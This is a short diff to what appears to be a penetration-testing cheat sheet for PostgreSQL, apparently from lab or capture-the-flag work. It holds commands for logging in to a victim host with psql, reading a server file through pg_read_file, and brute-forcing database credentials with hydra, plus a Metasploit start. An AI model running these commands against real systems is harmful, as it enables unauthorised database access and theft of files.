@@ -10,7 +10,7 @@ run
 ```
 ### <span style="color:#50FA7B">Manual Access via psql:</span>
 ```bash
-psql -U postgres -p 5437 -h $VICTIM_IP
+psql -U $USER -p 5437 -h $VICTIM_IP
 ```
 
 ###
@@ -24,7 +24,7 @@ SELECT pg_read_file('/home/wilson/local.txt');
 ### <span style="color:#50FA7B">Brute Force Credentials</span>
 ```bash
 hydra -l username -P passwords.txt $VICTIM_IP postgres
-hydra -L usernames.txt -p password $VICTIM_IP postgres
+hydra -L usernames.txt -p $PASS $VICTIM_IP postgres
 
 # Metasploit
 msfconsole
